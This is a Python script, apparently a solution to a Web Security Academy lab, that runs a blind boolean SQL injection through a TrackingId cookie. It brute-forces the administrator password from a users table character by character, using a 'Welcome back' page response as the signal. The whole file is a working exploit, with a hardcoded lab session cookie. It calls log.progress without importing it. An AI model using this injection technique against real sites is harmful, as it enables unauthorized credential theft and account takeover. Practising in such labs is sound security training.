from termcolor import colored
import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLi")

def makeSQLi():
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"V1CL15KXQvlORptL' and (select substring(password,{position},1) from users where username='administrator') = '{character}'-- -",
                'session': '23NIkcvFiXyjWMAcm411kVbA2K2QyF4S'
            }

            p1.status(f"TrackingId")

            r = requests.get("https://0af4004804a9dbd1806b3f69003200f1.web-security-academy.net", cookies=cookies)

            if "Welcome back" in r.text:
                password+=character
                p2.status(password)
                break
            #    print(character)

if __name__ == '__main__':
    makeSQLi()
